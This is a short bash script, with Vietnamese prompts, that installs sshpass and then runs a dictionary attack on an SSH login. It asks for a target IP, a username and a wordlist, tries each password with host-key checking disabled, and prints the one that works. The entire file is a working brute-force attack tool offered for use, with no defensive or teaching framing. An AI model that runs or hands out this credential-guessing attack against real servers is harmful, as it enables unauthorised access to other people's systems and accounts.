#/bin/bash
#script scan password ssh
check_sshclient=`rpm -qa | grep openssh-clients`
if [ "$check_sshclient" = "" ]; then
	yum -y install openssh-clients
fi
check_sshpass=`rpm -qa | grep sshpass`
if [ "$check_sshpass" = "" ]; then
check_epel=`rpm -qa | grep epel`
	if [ "$check_epel" = "" ]; then
		yum -y install https://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm
	fi
yum -y install sshpass
fi
read -p"IP Server Check: " ipaddr
if [ "$ipaddr" = "" ]; then
    printf "Error: IP Addr not null"
    sleep 5
    sh $tf
fi
echo ""
read -p"User Check: " usrcheck
if [ "$usrcheck" = "" ]; then
    printf "Error: user not null"
    sleep 5
    sh $tf
fi
echo ""
read -p"Tu Dien Check: " dircheck

for i in $( cat $dircheck );
do
#echo "$usrcheck@$ipaddr"
abc=`sshpass -p "$i" ssh -o StrictHostKeyChecking=no "$usrcheck"@"$ipaddr" w 2>/dev/null`
if [ "$abc" != "" ];
then
	echo "$usrcheck@$ipaddr and password: $i"
exit 1
fi
done
echo "tu dien ko co password can tim"
